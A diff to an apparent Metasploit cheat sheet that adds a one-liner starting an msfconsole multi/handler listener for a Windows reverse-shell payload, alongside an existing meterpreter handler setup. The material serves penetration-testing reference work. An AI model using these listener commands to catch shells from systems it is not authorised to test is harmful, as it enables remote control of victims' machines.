@@ -15,6 +15,7 @@ sudo msfconsole -q
 ```
 
 For ParrotOS [see](https://github.com/ParrotSec/metasploit-framework)
+
 ## Modules
 
 Module Name | Description
@@ -36,6 +37,10 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST $LISTENING-IP
 set LPORT $LISTENING-PORT
 exploit
+```
+Or linux one-liner
+```bash
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $interface; set LPORT 4444;exploit"
 ```
 
 ## Commands
